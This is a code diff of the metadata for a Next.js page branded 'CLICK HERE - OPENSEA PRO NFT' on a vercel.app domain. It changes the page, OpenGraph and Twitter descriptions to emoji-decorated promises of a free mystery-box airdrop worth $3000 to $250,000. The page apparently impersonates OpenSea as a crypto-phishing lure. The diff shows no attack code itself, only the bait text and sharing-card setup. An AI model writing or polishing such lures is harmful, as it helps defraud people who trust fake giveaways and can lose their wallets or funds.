@@ -4,11 +4,11 @@ import type { ReactNode } from "react";
 export const metadata: Metadata = {
   title: "CLICK HERE - OPENSEA PRO NFT",
   description:
-    "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
+    "🟢 AIRDROP IS LIVE NOW 🟢  🎉 Price: FREE  🎉 Supply: 150 Mystery Box  🎉 Reward: between $3000 and $250,000  TRY YOUR LUCK ! 🚀",
   openGraph: {
     title: "CLICK HERE - OPENSEA PRO NFT",
     description:
-      "AIRDROP IS LIVE NOW  Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
+      "🟢 AIRDROP IS LIVE NOW 🟢  🎉 Price: FREE  🎉 Supply: 150 Mystery Box  🎉 Reward: between $3000 and $250,000  TRY YOUR LUCK ! 🚀",
     url: "https://openseaclaims-chi.vercel.app/",
     siteName: "This is an automatically generated announcement message",
     images: [
@@ -25,7 +25,7 @@ export const metadata: Metadata = {
     card: "summary_large_image",
     title: "CLICK HERE - OPENSEA PRO NFT",
     description:
-      "AIRDROP IS LIVE NOW Price: FREE 389 Supply: 150 Mystery Box 389 Reward: between $3000 and $250,000",
+      "🟢 AIRDROP IS LIVE NOW 🟢  🎉 Price: FREE  🎉 Supply: 150 Mystery Box  🎉 Reward: between $3000 and $250,000  TRY YOUR LUCK ! 🚀",
     images: ["https://openseaclaims-chi.vercel.app/389-9bec97c22fa2e411.gif"],
   },
 };
